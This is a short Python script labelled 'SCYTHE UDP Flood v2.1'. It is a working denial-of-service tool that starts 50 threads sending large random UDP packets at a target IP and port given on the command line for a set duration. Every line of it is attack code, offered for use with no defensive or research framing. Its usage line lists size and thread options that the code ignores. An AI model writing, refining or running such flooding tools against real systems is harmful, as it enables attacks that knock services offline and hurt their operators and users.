# SCYTHE UDP Flood v2.1
import sys, socket, time, random, threading
if len(sys.argv) < 4: print('Usage: python3 udp.py <ip> <port> <time> [size] [threads]'); sys.exit(1)
ip, port, duration = sys.argv[1], int(sys.argv[2]), int(sys.argv[3])
print(f'[SCYTHE] UDP Flood: {ip}:{port} | {duration}s')
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
packet = random._urandom(65500)
total = 0
lock = threading.Lock()
def flood():
  global total
  end = time.time() + duration
  while time.time() < end:
    try: sock.sendto(packet, (ip, port)); total += 1
    except: pass
for _ in range(50):
  threading.Thread(target=flood, daemon=True).start()
time.sleep(duration)
print(f'[UDP] Completed: {total} packets')